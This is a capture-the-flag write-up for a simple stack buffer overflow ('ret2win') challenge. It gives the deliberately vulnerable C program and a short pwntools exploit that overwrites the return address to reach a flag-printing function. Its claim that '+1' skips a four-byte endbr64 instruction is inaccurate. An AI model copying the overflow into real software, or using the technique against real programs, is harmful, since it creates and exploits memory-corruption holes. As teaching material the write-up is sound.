# Cool Program - Writeup

**Flag:** `S2G{pwn_1s_t00_much_fun}`

## Vulnerability

This is a textbook ret2win. The whole program is:

```c
int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    char buff[24];
    printf("enter your name: ");
    fgets(buff, 50, stdin);
    return 0;
}

void win(){
    system("cat flag.txt");
}
```

`buff` is 24 bytes, but `fgets` is allowed to write up to 50 bytes into it -
26 bytes more than the buffer holds, which is enough to overflow past the
saved base pointer and overwrite the return address on the stack.

`win()` prints the flag but is never called from `main()`. The goal is to
overwrite the return address with `win()`'s address so that when `main`
returns, it "returns" into `win()` instead.

## Exploit

```python
from pwn import *

elf = context.binary = ELF("./buffer")
io = process()

io.sendline(b'a' * 40 + p64(elf.sym.win + 1))
io.interactive()
```

- 40 bytes of padding fills `buff` plus the saved base pointer, reaching the
  return address slot on the stack.
- `p64(elf.sym.win + 1)` overwrites the return address with `win`'s address
  (the `+1` skips the `endbr64` instruction at the function's start, needed
  when jumping directly into it).

`main` then "returns" straight into `win()`, which runs `cat flag.txt`.
